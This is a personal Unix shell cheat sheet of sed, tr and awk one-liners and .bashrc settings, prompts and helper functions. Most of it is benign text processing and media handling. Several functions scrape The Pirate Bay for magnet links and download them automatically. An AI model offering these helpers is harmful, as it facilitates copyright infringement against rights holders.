$> | tr 't' 'T'
##------------------------------------------
## Change case
$> | tr [:lower:] [:upper:]
##------------------------------------------
## Remove 'squeeze' extra spaces into one space
$> | tr -s " "
##------------------------------------------
## Replace anything that is NOT a letter “a” with a letter “x”:
$> | tr -c "a" "x"
##------------------------------------------
## Delete lines containing pattern
$> | sed '/pattern to match/d'
##------------------------------------------
## insert a blank line above every line which matches "regex"
$> | sed '/regex/{x;p;x;}'
##------------------------------------------
# insert a blank line below every line which matches "regex"
$> | sed '/regex/G'
##------------------------------------------
http://sed.sourceforge.net/sed1line.txt
##------------------------------------------
## insert a blank line above and below every line which matches "regex"
$> | sed '/regex/{x;p;x;G;}'
##------------------------------------------
## number each line of a file (simple left alignment). Using a tab (see
## note on '\t' at end of file) instead of space will preserve margins.
$> | sed = filename | sed 'N;s/\n/\t/'
##------------------------------------------
## number each line of a file (number on left, right-aligned)
$> | sed = filename | sed 'N; s/^/     /; s/ *\(.\{6,\}\)\n/\1  /'
##------------------------------------------
## number each line of file, but only print numbers if line is not blank
$> | sed '/./=' filename | sed '/./N; s/\n/ /'
##------------------------------------------
## count lines (emulates "wc -l")
$> | sed -n '$='
##------------------------------------------
# IN UNIX ENVIRONMENT: convert DOS newlines (CR/LF) to Unix format.
$> | sed 's/.$//'               # assumes that all lines end with CR/LF
##------------------------------------------
## IN UNIX ENVIRONMENT: convert Unix newlines (LF) to DOS format.
$> | sed 's/$'"/`echo \\\r`/"             # command line under bash
##------------------------------------------
## delete trailing whitespace (spaces, tabs) from end of each line
$> | sed 's/[ \t]*$//'
##------------------------------------------
## delete BOTH leading and trailing whitespace from each line
$> | sed 's/^[ \t]*//;s/[ \t]*$//'
##------------------------------------------
## substitute (find and replace) "foo" with "bar" on each line
$> | sed 's/foo/bar/'             # replaces only 1st instance in a line
$> | sed 's/foo/bar/4'            # replaces only 4th instance in a line
$> | sed 's/foo/bar/g'            # replaces ALL instances in a line
$> | sed 's/\(.*\)foo\(.*foo\)/\1bar\2/' # replace the next-to-last case
$> | sed 's/\(.*\)foo/\1bar/'            # replace only the last case
##------------------------------------------
## substitute "foo" with "bar" ONLY for lines which contain "baz"
$> | sed '/baz/s/foo/bar/g'
##------------------------------------------
## substitute "foo" with "bar" EXCEPT for lines which contain "baz"
$> | sed '/baz/!s/foo/bar/g'
##------------------------------------------
## reverse order of lines (emulates "tac") bug/feature in HHsed v1.5 causes blank lines to be deleted
$> | sed '1!G;h;$!d'               # method 1
$> | sed -n '1!G;h;$p'             # method 2
##------------------------------------------
## reverse each character on the line (emulates "rev")
$> | sed '/\n/!G;s/\(.\)\(.*\n\)/&\2\1/;//D;s/.//'
##------------------------------------------
## change "scarlet" or "ruby" or "puce" to "red"
$> | sed 's/scarlet/red/g;s/ruby/red/g;s/puce/red/g'   # most seds
##------------------------------------------
## if a line ends with a backslash, append the next line to it
$> | sed -e :a -e '/\\$/N; s/\\\n//; ta'
##------------------------------------------
## if a line begins with an equal sign, append it to the previous line and replace the "=" with a single space
$> | sed -e :a -e '$!N;s/\n=/ /;ta' -e 'P;D'
##------------------------------------------
# add commas to numeric strings, changing "1234567" to "1,234,567"
$> | sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta'
##------------------------------------------
## print first 10 lines of file (emulates behavior of "head")
$> | sed 10q
##------------------------------------------
## print the last 10 lines of a file (emulates "tail")
$> | sed -e :a -e '$q;N;11,$D;ba'
##------------------------------------------
# print only lines which match regular expression (emulates "grep")
$> | sed -n '/regexp/p'           # method 1
$> | sed '/regexp/!d'             # method 2
##------------------------------------------
## print only lines which do NOT match regexp (emulates "grep -v")
$> | sed -n '/regexp/!p'          # method 1, corresponds to above
$> | sed '/regexp/d'              # method 2, simpler syntax
##------------------------------------------
## print the line immediately before a regexp, but not the line containing the regexp
$> | sed -n '/regexp/{g;1!p;};h'
##------------------------------------------
## print the line immediately after a regexp, but not the line containing the regexp
$> | sed -n '/regexp/{n;p;}'
##------------------------------------------
## print 1 line of context before and after regexp, with line number
## indicating where the regexp occurred (similar to "grep -A1 -B1")
$> | sed -n -e '/regexp/{=;x;1!p;g;$!N;p;D;}' -e h
##------------------------------------------
## grep for AAA and BBB and CCC (in any order)
$> | sed '/AAA/!d; /BBB/!d; /CCC/!d'
## grep for AAA and BBB and CCC (in that order)
$> | sed '/AAA.*BBB.*CCC/!d'
## grep for AAA or BBB or CCC (emulates "egrep")
$> | sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d    # most seds
## print paragraph if it contains AAA (blank lines separate paragraphs)
## HHsed v1.5 must insert a 'G;' after 'x;' in the next 3 scripts below
$> | sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;'
## print paragraph if it contains AAA and BBB and CCC (in any order)
$> | sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;/BBB/!d;/CCC/!d'
## print paragraph if it contains AAA or BBB or CCC
$> | sed -e '/./{H;$!d;}' -e 'x;/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d
##------------------------------------------
## print only lines of 65 characters or longer
$> | sed -n '/^.\{65\}/p'
## print only lines of less than 65 characters
$> | sed -n '/^.\{65\}/!p'        # method 1, corresponds to above
$> | sed '/^.\{65\}/d'            # method 2, simpler syntax
##------------------------------------------
## print section of file from regular expression to end of file
$> | sed -n '/regexp/,$p'
##------------------------------------------
## print section of file based on line numbers (lines 8-12, inclusive)
$> | sed -n '8,12p'               # method 1  -n, --quiet, --silent suppress automatic printing of pattern space
$> | sed '8,12!d'                 # method 2
##------------------------------------------
## print line number 52
$> | sed -n '52p'                 # method 1
$> | sed '52!d'                   # method 2
$> | sed '52q;d'                  # method 3, efficient on large files
##------------------------------------------
## print section of file between two regular expressions (inclusive)
$> | sed -n '/Iowa/,/Montana/p'             # case sensitive
## print all of file EXCEPT section between 2 regular expressions
$> | sed '/Iowa/,/Montana/d'
##------------------------------------------
## delete duplicate, consecutive lines from a file (emulates "uniq"). First line in a set of duplicate lines is kept, rest are deleted.
$> | sed '$!N; /^\(.*\)\n\1$/!P; D'
##------------------------------------------
## delete all lines except duplicate lines (emulates "uniq -d").
$> | sed '$!N; s/^\(.*\)\n\1$/\1/; t; D'
##------------------------------------------
## delete the first 10 lines of a file
$> | sed '1,10d'
##------------------------------------------
## delete the last line of a file
$> | sed '$d'
## delete the last 2 lines of a file
$> | sed 'N;$!P;$!D;$d'
##------------------------------------------
## delete the last line of each paragraph
$> | sed -n '/^$/{p;h;};/./{x;/./p;}'
##------------------------------------------
## remove most HTML tags (accommodates multiple-line tags)
$> | sed -e :a -e 's/<[^>]*>//g;/</N;//ba'
##------------------------------------------
## delete the last 10 lines of a file
$> | sed -e :a -e '$d;N;2,10ba' -e 'P;D'   # method 1
$> | sed -n -e :a -e '1,10!{P;N;D;};N;ba'  # method 2
## delete every 8th line
$> | gsed '0~8d'                           # GNU sed only
$> | sed 'n;n;n;n;n;n;n;d;'                # other seds
##------------------------------------------
## From
$> | tr ' ' '\n' | awk '{ n = split($NF, arr, ","); print arr[n] }'
##------------------------------------------
## remove any line that has YOURWORDHERE in it.
$> | sed -i "/^.*YOURWORDHERE.*$/d"
##------------------------------------------
## Print first and last column in text
$> | awk -F ' ' '{print $1, $NF}'
##------------------------------------------
## Switch to Upercase
$> | tr abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ
## or
$> | tr "[:lower:]" "[:upper:]"
## or
$> | tr "a-z" "A-Z"
##------------------------------------------
## Change newlines to spaces
$> | sed ':a;N;$!ba;s/\n/ /g'
## extract column from csv file
$> | cut -d"," -f9
##------------------------------------------
## remove comments (even those starting with spaces), empty lines (even those containing spaces) in one grep command
## useful for discarding even those comments which start with blanks or those empty lines which contain blanks Show Sample Output
$> | grep -vE '^\s*(#|$)'
##-------------------
## Switch to Upercase
$> | tr abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ
## or
$> | tr "[:lower:]" "[:upper:]"
## or
$> | tr "a-z" "A-Z"
##------------------------------------------
## os. files. Redirect stdout to a file.
$> | sudo tee -a /path/to/file
##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------
## center all text in the middle of 79-column width. In method 1,
## spaces at the beginning of the line are significant, and trailing
## spaces are appended at the end of the line. In method 2, spaces at
## the beginning of the line are discarded in centering the line, and
## no trailing spaces appear at the end of lines.
$> | sed  -e :a -e 's/^.\{1,77\}$/ & /;ta'                     # method 1
$> | sed  -e :a -e 's/^.\{1,77\}$/ &/;ta' -e 's/\( *\)\1/\1/'  # method 2
##------------------------------------------

##------------------------------------------

##------------------------------------------

##------------------------------------------
##==========================================
## #########################################################
## ##    END Cool | Pipes
## #########################################################
##
##
##
## ###########################################################
## ##    .bashrc
## ###########################################################
# /etc/profile.d/best_bash_history.sh
# Save 5,000 lines of history in memory
$> HISTSIZE=10000
# Save 2,000,000 lines of history to disk (will have to grep ~/.bash_history for full listing)
$> HISTFILESIZE=2000000
# Append to history instead of overwrite
$> shopt -s histappend
# Ignore redundant or space commands
$> HISTCONTROL=ignoreboth
# Ignore more
$> HISTIGNORE='ls:ll:ls -alh:pwd:clear:history'
# Set time format
$> HISTTIMEFORMAT='%F %T '
# Multiple commands on one line show up as a single line
$> shopt -s cmdhist
# Append new history lines, clear the history list, re-read the history list, print prompt.
$> export PROMPT_COMMAND="history -a; history -c; history -r; $PROMPT_COMMAND"
##==========================================
##  Copy the next section between <<COMMENT1 and COMMENT1 to .bashrc to get a new set of functions and aliases.
<<COMMENT1
## ###########################################################
## ##    .bashrc
## ###########################################################
## ###########################################
## ##    Settings
## ###########################################
##------------------------------------------
## If not running interactively, do not do anything
case $- in *i*) ;; *) return;; esac
### Shell Options, Change the setting of each shell option: help shopt
## Append to the history file, do not overwrite it
shopt -s histappend
## Check the window size after each command and, if necessary, update the values of LINES and COLUMNS.
shopt -s checkwinsize
## Make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"##
## Cool colors, but mc will not work in tty logins
#export TERM=xterm-256color
## Colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
## Enable color support
if [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)";  fi
## ~/.bash_aliases, instead of adding them here directly.
if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases; fi
## Enable programmable completion features (you do not need to enable this, if it's already enabled in /etc/bash.bashrc and /etc/profile sources /etc/bash.bashrc).
if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion; elif [ -f /etc/bash_completion ]; then . /etc/bash_completion; fi; fi
## Use CapLock as second backspace
#setxkbmap -option caps:backspace
## Use CapLock as second control key
setxkbmap -option ctrl:nocaps
## AWS Amazon Web Services specific settings add in the keys
#export AWS_ACCESS_KEY_ID=''
#export AWS_SECRET_ACCESS_KEY=''
#export AWS_SESSION_TOKEN=''
## ##############
## #   Prompt   #
## ##############
##------------------------------------------
## Initialize colors.
autoload -U colors
colors
## Allow for functions in the prompt.
setopt PROMPT_SUBST
autoload -U add-zsh-hook
autoload -Uz compinit && compinit
## set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in xterm|xterm-color|*-256color) color_prompt=yes;; esac
##------------------------------------------
## set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot); fi
## set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in xterm|xterm-color|*-256color) color_prompt=yes;; esac
## uncomment for a colored prompt, if the terminal has the capability.
force_color_prompt=yes
if [ -n "$force_color_prompt" ]; then if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then color_prompt=yes; else color_prompt=;     fi; fi
if [ "$color_prompt" = yes ]; then if [[ ${EUID} == 0 ]] ; then PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\h\[\033[01;34m\] \W \$\[\033[00m\] '; else PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\] \[\033[01;34m\]\w \$\[\033[00m\] '; fi; else PS1='${debian_chroot:+($debian_chroot)}\u@\h \w \$ '; fi
unset color_prompt force_color_prompt
## If this is an xterm set the title to user@host:dir
#case "$TERM" in xterm*|rxvt*) PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h \w\a\]$PS1"; ;; *) ;; esac
## #####################################
## ##    Prompt
## #####################################
##-----------------------------------------
## Mint Prompt
#PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\] \[\033[01;34m\]\w \$\[\033[00m\] '
##-----------------------------------------
## Mint Prompt😆
#PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\] \[\033[01;34m\]\w \😆\[\033[00m\] '
##-----------------------------------------
### Prompt
## set a fancy prompt (non-color, overwrite the one in /etc/profile)
#PS1='${debian_chroot:+($debian_chroot)}\u@\h \w \$> '
##------------------------------------------
## Set a colorful red bash prompt
#PS1='\[\e[1;31m\][\u@\h \W]\$>\[\e[0m\] '
##------------------------------------------
## Set a colorful green bash prompt
#PS1='\[\e[1;32m\][\u@\h \W]\$>\[\e[0m\] '
##------------------------------------------
## Set a colorful green bash prompt
#PS1='\[\e[1;32m\]\u@\h \W\$>\e[0m '
##------------------------------------------
## nuts with colors (figure 3):
#PS1='\[\e[1;36m\]\d \[\e[1;32m\]\t \[\e[1;33m\]\u@\[\e[1;35m\]\h:\w\$\[\e[0;31m\] '
##------------------------------------------
## Timestamped best prompt, git branch with tracking
## Untracked changes: ▲ , Unstaged Changed Files: ◼ , Staged Files: ●
## https://upload.wikimedia.org/wikipedia/commons/1/15/Xterm_256color_chart.svg
## grey:008 red:009 green:010 yellow:011 blue:012 magenta:013 cyan:014 white:015
function thedate() { date --utc +"%Y%m%d_%H:%M:%S" ; }
function parse_git_branch() { git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/ (\1)/'; }
function parse_git_untracked() { git status 2> /dev/null | grep Untracked | head -n1 | sed 's/Untracked files\:/\▲/'; }
function parse_git_unstaged() { git status 2> /dev/null | grep 'Changes not staged for commit' | head -n1 | sed 's/Changes not staged for commit\:/\◼/'; }
## BASH
#> function parse_git_tracked() { git status 2> /dev/null | grep 'Changes to be committed' | head -n1 | sed 's/Changes to be committed\:/\●/'; }
## BASH
#PS1='\e[1;37m\h:\e[1;32m$(thedate)\e[1;34m\w\e[1;37m$(parse_git_branch)\e[1;33m$(parse_git_untracked)\e[1;34m$(parse_git_unstaged)\e[1;32m$(parse_git_tracked)\e[m⚡'
## ZSH
#> function parse_git_tracked() { git status 2> /dev/null | grep 'Changes to be committed' | head -n1 | sed 's/Changes to be committed\:/\●/'; }
#PS1='%B%F{011}%\S^%b%F{154}$(thedate)%F{039}%~%f%B$(parse_git_branch)%F{011}$(parse_git_untracked)%F{012}$(parse_git_unstaged)%F{010}$(parse_git_tracked)%{$reset_color%}%b%f⚡'
#PS1='%B%F{011}%\S^%b%F{154}$(thedate)%F{039}%~%f%B$(parse_git_branch)%F{011}$(parse_git_untracked)%F{012}$(parse_git_unstaged)%F{010}$(parse_git_tracked)%{$reset_color%}%b%f⚡'
## For bash
#PS1="\[\033[01;36m\]\$(date --utc +"%Y%m%d_%H:%M:%S")\033[01;33m\]@\033[01;32m\]\h\[\033[01;34m\]\w\[\033[00;00m\]$(parse_git_branch)\[\033[00;31m\]$(parse_git_untracked)\[\033[01;33m\]$(parse_git_unstaged)\[\033[01;32m\]$(parse_git_tracked)\[\033[00;00m\]⚡ \e[0m"
##-----------------------------------------
##-----------------------------------------
##==========================================
## ###############
## ##   History
## ###############
##------------------------------------------
## Increase the size of the .bash_history file
export HISTFILESIZE=1000000000
export HISTSIZE=1000000
#export HISTFILESIZE='10000'
#export HISTSIZE='5000'
## append to the history file, do not overwrite it
shopt -s histappend
# do not put duplicate lines in the history and do not add lines that start with a space
export HISTCONTROL=erasedups:ignoredups:ignorespace
# Ignore more
HISTIGNORE='ls:ll:ls -alh:pwd:clear:history'
# Set time format
#HISTTIMEFORMAT='%F %T '
##==========================================
## ###########################################
## ##    Functions
## ###########################################
##------------------------------------------
#===========================================
## ######################
## ##    System
## ######################
##------------------------------------------
#===========================================
## Suspend to RAM low power
function suspendnow() { dbus-send --system --print-reply --dest=org.freedesktop.UPower /org/freedesktop/UPower org.freedesktop.UPower.Suspend; }
##==========================================
# Make changes in .bashrc immediately available
function bashrc-reload() { builtin exec bash ; }
##==========================================
## Add a function you've defined to .bashrc
function addfunction() { declare -f $1 >> ~/.bashrc ; }
##==========================================
# Add an alias to .bashrc
function bashrc() { echo "alias $1='$2'" >> .bashrc ; }
##==========================================
## Pick the default global mc skin. Usage; mcdefault skin-name    Expl. mcdefault gotar    To Reverse: mcdefault default-blue
function mcdefault() { if [ ! -f /usr/share/mc/skins/default-blue.ini ]; then sudo cp /usr/share/mc/skins/default.ini /usr/share/mc/skins/default-blue.ini  && sudo rm /usr/share/mc/skins/default.ini ; sudo cp /usr/share/mc/skins/$1.ini /usr/share/mc/skins/default.ini ; else  sudo rm /usr/share/mc/skins/default.ini ; sudo cp /usr/share/mc/skins/$1.ini /usr/share/mc/skins/default.ini ; echo "The default midnight commander skin is now $1".; fi ; }
##==========================================
## ls -l with octal permissions
function lso() { ls -l ${1} | sed -e 's/--x/1/g' -e 's/-w-/2/g' -e 's/-wx/3/g' -e 's/r--/4/g' -e 's/r-x/5/g' -e 's/rw-/6/g' -e 's/rwx/7/g' -e 's/---/0/g' ; }
##==========================================
## cd then ls. Also made alias cdd for this function
function cdls() { cd ${1} && ls -h --color=always --group-directories-first ; }
##==========================================
## List contents of directory by size.
function dusize () { du -sk ./* | sort -n | awk 'BEGIN{ pref[1]="K"; pref[2]="M"; pref[3]="G";} { total = total + $1; x = $1; y = 1; while( x > 1024 ) { x = (x + 1023)/1024; y++; } printf("%g%s\t%s\n",int(x*10)/10,pref[y],$2); } END { y = 1; while( total > 1024 ) { total = (total + 1023)/1024; y++; } printf("Total: %g%s\n",int(total*10)/10,pref[y]); }' ; }
##==========================================
## Get IP address information
function ipinfo() { echo "InternalIP" ; ifconfig | grep 'inet ' | grep -v 127.0 | awk '{print $2 }' | sed 's/addr://' ; echo "RouterIP" ; ip route show | grep -i 'default via'| awk '{print $3 }' ; echo "ExternalIP" ; curl ifconfig.co ; }
##==========================================
## Set and unset proxy settings.[<proxy-scheme>://]<proxy-host>[:<proxy-port>] Usage: setproxy 173.255.233.249:8888
## Some good proxies https://www.socks-proxy.net/, https://free-proxy-list.net/
function setproxy() { export {http,https,ftp}_proxy="$1" ; }
function unsetproxy() { unset {http,https,ftp}_proxy ; }
##=========================================
## Define a bash function to interactively pick a subdirectory to cd into
function cdb() { select dir in $(find -type d -name "$1" -not -path '*/\.*' -prune); do cd "${dir}" && break; done }
##==========================================
## Find the package that installed a command
function whatinstalled() { which "$@" | xargs -r readlink -f | xargs -r dpkg -S ;}
##==========================================
## A function to find a file in the pwd downwards
function fn() { find . -iname "*$1*" 2>/dev/null ; }
##==========================================
## swap 2 filenames around
function swapname() { local TMPFILE=tmp.$$; mv "$1" $TMPFILE; mv "$2" "$1"; mv $TMPFILE "$2"; }
##==========================================
## Handy Extract Program
function extract() { if [ -f $1 ] ; then case $1 in *.tar.bz2) tar xvjf $1 ;; *.tar.gz) tar xvzf $1 ;; *.bz2) bunzip2 $1 ;; *.rar) unrar x $1 ;; *.gz) gunzip $1 ;; *.tar) tar xvf $1 ;; *.tbz2) tar xvjf $1 ;; *.tgz) tar xvzf $1 ;; *.zip) unzip $1 ;; *.Z) uncompress $1 ;; *.7z) 7z x $1 ;; *) echo "'$1' cannot be extracted via >extract<" ;; esac; else echo "'$1' is not a valid file"; fi; }
##==========================================
## Size of directories in MB. Usage: ds directory
function ds() { echo "Size MB        Directories"; if [ $# -lt 1 ] || [ $# -gt 2 ]; then find $DIR -maxdepth 1 -type d -exec du -sm \{\} \; | sort -nr; else find $1 -maxdepth 1 -type d -exec du -sm \{\} \; | sort -nr; fi; }
##==========================================
function showdiff() { wdiff -n -w $'\033[30;41m' -x $'\033[0m' -y $'\033[30;42m' -z $'\033[0m' $1 $2 ; }
##==========================================
## scp sending to AWS Usage: scpsend file_to_send remote_folder   exp1: scpsend puppy.gif public  exp2: scpsend puppyfull.gif private
function scpsend() { scp -i ./commandlinefun.pem "$1" $USER@13.57.229.253:/var/www/html/$2; }
##==========================================
# Searches for text in all files in the current folder -i case-insensitive -I ignore binary files -H causes filename to be printed -r recursive search -n causes line number to be printed -F treat search term as a literal, not a regular expression -l only print filenames and not the matching lines ex. grep -irl "$1" *
function greptext () { grep -iIHrn --color=always "$1" . ; }
##==========================================
## Share file through http 8088 port. Usage: sharefile "FILENAME".
#function sharefile() { nc -v -l 8088 < $2 ; }
##==========================================
## Share file through your choice of http port. Usage: sharefile port "FILENAME".
#function shareport() { nc -v -l $1 < $2 ; }
##==========================================
## Share current directory through http 8000
function webshare() { python -c "import SimpleHTTPServer;SimpleHTTPServer.test()"; }
function pyshare() { python –m SimpleHTTPServer 8000 ; }
##==========================================
## #############
## ##    GUI
## #############
##------------------------------------------
##==========================================
## Transform Mint Linux 17/18 icons to create any color
function iconcolors() { cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-$1-$2 ; cd ~/.icons/Mint-X-$1-$2 ; grep -ri -l "#a7c6df" | xargs sed -i -e 's/"opacity:0/"opacity:1/g' -e "s/0b5a7d/888889/g" -e "s/a7c6df/$2/g" -e "s/308fba/$1/g" ; }
##==========================================
## #################
## ##    Search
## #################
##------------------------------------------
##==========================================
## Get definition from etymonline.com.
function define() { for term in "$@"; do url="etymonline.com/index.php?term=$term"; curl -s $url | grep "<dd " | sed -e 's/<a[^>]*>\([^<]*\)<[^>]*>/:\1:/g' -e 's/<[^>]*>//g' | fold -sw `[ $COLUMNS -lt 80 ] && echo $COLUMNS || echo 79 `; echo; done; }
##==========================================
## Lookup on IMDB Internet Movie Database
function imdb() { w3m -dump "http://www.imdb.com/find?s=all&q="${@}"&x=0&y=0" & }
##==========================================
## Get the weather. Usage 'weather zipcode'. Example 'weather 94114' outputs 'San Francisco, CA | 54.9 degrees F | Overcast'.
#function weather() { curl -s "http://www.wunderground.com/q/zmw:$1.1.99999" | grep "og:title" | cut -d\" -f4 | sed 's/&deg;/ degrees F/'; }
function weather() { curl wttr.in/"$1"; }
##==========================================
## search google from cli
function google() { Q="$@";GOOG_URL='https://www.google.com/search?tbs=li:1&q=';AGENT="Mozilla/4.0";stream=$(curl -A "$AGENT" -skLm 10 "${GOOG_URL}${Q//\ /+}");echo "$stream" | grep -o "href=\"/url[^\&]*&amp;" | sed 's/href=".url.q=\([^\&]*\).*/\1/' | sed 's/%3Fv%3D/?v=/';}
##==========================================
## search youtube from cli
function youtube() { Q="$@";GOOG_URL='https://www.google.com/search?tbs=li:1&q=site:youtube.com+';AGENT="Mozilla/4.0";stream=$(curl -A "$AGENT" -skLm 10 "${GOOG_URL}${Q//\ /+}");echo "$stream" | grep -o "href=\"/url[^\&]*&amp;" | sed 's/href=".url.q=\([^\&]*\).*/\1/' | sed 's/%3Fv%3D/?v=/' | uniq ;}
##==========================================
## Search and play youtube videos directly to terminal (no X needed) $> youtubeplay 'Stairway to heaven - Led Zeppelin'. mplayer is pauseable and can skip ahead
function youtubeplay() { youtube-dl -q --max-downloads 1 --no-playlist --default-search ${2:-ytsearch} "$1" -o - | mplayer -vo null /dev/fd/3 3<&0 </dev/tty; }
##==========================================
##Streams youtube-dl video to mplayer.
##syt 'youtube.com/link' 'anotherlinkto.video'
function syt() { pipe=`mktemp -u`; mkfifo -m 600 "$pipe" && for i in "$@"; do youtube-dl -qo "$pipe" "$i" & mplayer "$pipe" || break; done; rm -f "$pipe"; }
##------------------------------------------
## Play in ascii mode: syt-caca 'youtube.com/link' 'anotherlinkto.video'
function syt-caca() { pipe=`mktemp -u`; mkfifo -m 600 "$pipe" && for i in "$@"; do youtube-dl -qo "$pipe" "$i" & mplayer -vo caca "$pipe" || break; done; rm -f "$pipe"; }
##------------------------------------------
## Play in ascii mode: syt-caca 'youtube.com/link' 'anotherlinkto.video'
function syt-fb() { pipe=`mktemp -u`; mkfifo -m 600 "$pipe" && for i in "$@"; do youtube-dl -qo "$pipe" "$i" & mplayer -vo fbdev2 -fs "$pipe" || break; done; rm -f "$pipe"; }
##==========================================
## Get magnet link from URL
function magnetlink() { curl -s $1 | grep "magnet:" | sed -r 's/.*(magnet:[^"]*).*/\1/g' | head -1 ; }
function magnetlinkall() { curl -s $1 | grep "magnet:" | sed -r 's/.*(magnet:[^"]*).*/\1/g' ; }
##==========================================
## Search then download from thepiratebay magnet links. If this thepiratebay closes change for one that works
## 1. Search piratebay. Usage: piratebay "searchterm1 searchterm2", then pick one to download below.
function thepiratebay() { w3m -dump https://thepiratebay10.org/search/"$1"/ ; }
##-----------------------------------------
## Look at magnet link if you want to see it otherwise just dl below.  thepiratebaymagnet "searchterm1 searchterm2" number_of_the_desired_Download i.e. thepiratebaymagnet "Django" 4
function thepiratebaymagnet() { curl -s  https://thepiratebay10.org/search/"$1"/ | grep "magnet:" | sed -r 's/.*(magnet:[^"]*).*/\1/g' | sed -n "$2p" ; }
##-----------------------------------------
## Search and dl from thepiratebay. Usage:  thepiratebaydl "searchterm1 searchterm2" number_of_the_desired_Download i.e. thepiratebaydl "Django" 4
function thepiratebaydl() { transmission-cli $(curl -s  https://thepiratebay10.org/search/'$1'/ | grep 'magnet:' | sed -r 's/.*(magnet:[^"]*).*/\1/g' |  sed -n "$2p" ) ; }
## After finished downloadeding transmission-cli will still be running seeding, to stop $> killall transmission-cli
##==========================================
## Not working. Changed site :(
## Play streaming media, find media at https://goo.gl/pdhhpQ or http://pub7.di.fm/ use as argument the string after Mount Point /
## Some favorite stations: di_bigbeat_aac.flv, di_bigbeat_aacplus, di_breaks_aacplus, di_classictrance_aacplus,
## Usage: streamfm bigbeat
#function streamfmls() { w3m -dump http://pub7.di.fm/ | grep 'Mount Point' | grep 'aac ' | sed 's/Mount Point \///g' | sed -e 's/ Login//g' -e 's/di_//g' -e 's/_aac//g' ; }
#function streamfm() { mplayer http://pub7.di.fm/di_$1_aac?1 -user-agent "AudioAddict-di/3.2.0.3240 Android/5.1" ; }
##==========================================
## ##############################
## ##    Media Encode
## ##############################
##------------------------------------------
##==========================================
## ???????rip audio from video ??????NOT WORKING??????
### ("$1" for output file & "$2" for input file)
function audioextract() { mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile "$1" "$2" ; }
##==========================================
## Rip a file with handbrake and good options
function rip() { handbrake -i /dev/dvd -o ${HOME}/${1}.mp4 -L -U -F -f mp4 -e x264 -b 4000 -B 192 ; }
##==========================================
## Convert matroska mkv video files to mp4 by changing container without reencoding.
function mkv2mp4() { ffmpeg -i "$1" -vcodec copy -acodec copy "$1".mp4 ; }
##==========================================
## Convert video files to mp4 by changing container without reencoding. Useage: copy2mp4 *.mkv
function copy2mp4() { avconv -i  "$1" -c:v copy -c:a copy "$1".mp4 ; }
##==========================================
## Convert video files to mp4 reencoding sound to mp3. Useage: copy2mp4 *.mkv
function copy2mp4mp3() { avconv -i  "$1" -c:v copy -c:a mp3 "$1".mp4 ; }
##==========================================
## Transcode video files to mp4 by changing container and reencoding. Long process. Useage: transcode2mp4 *.avi
function transcode2mp4() { avconv -i  "$1" -c:v libx264 -c:a mp3 "$1".mp4 ; }
##=========================================
## #################
## ##    Random
## #################
##------------------------------------------
##==========================================
## #######
## # box #
## #######
## Create box of characters around given string
## Usage, box 'string' character (optional character, default is "#") i.e.  box '   Peace   ' "☮"
function box() { t="$1xxxx";c=${2:-#}; echo ${t//?/$c}; echo "$c $1 $c"; echo ${t//?/$c}; }
##==========================================
## Create a Terminal Calculator from bc, calc 2+2 4 , calc "sqrt(2)" 1.41421356237309504880
function calc() { echo "${1}"|bc -l; }
##==========================================
## Display a formated comma seperated spreadsheet .csv for easy viewing.
function sheet() { cat "$1" | sed '1s/^/a,b,c,d,e,f,g,h,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb\n/' | column -s , -tn | nl -v 0 ; }
##------------------------------------------
## Evaluate the formulas in a csv spreadsheet.
function csvev() { cat $1 | sed -e '1i,,,,,,,' |sed -e 's/=sum/@sum/g' -e 's/=SUM/@SUM/g' | psc -k -d, | sed -e 's/\"@SUM(/@SUM(/' -e 's/)"/)/' | sed '/@SUM/ { s/rightstring/let/; }' | sed -e '/= "=/s/rightstring/let/' -e '/= "=/s/"//g' | sed 's/= =/= /g' | sc ; }
##==========================================
## Random cow says fortune
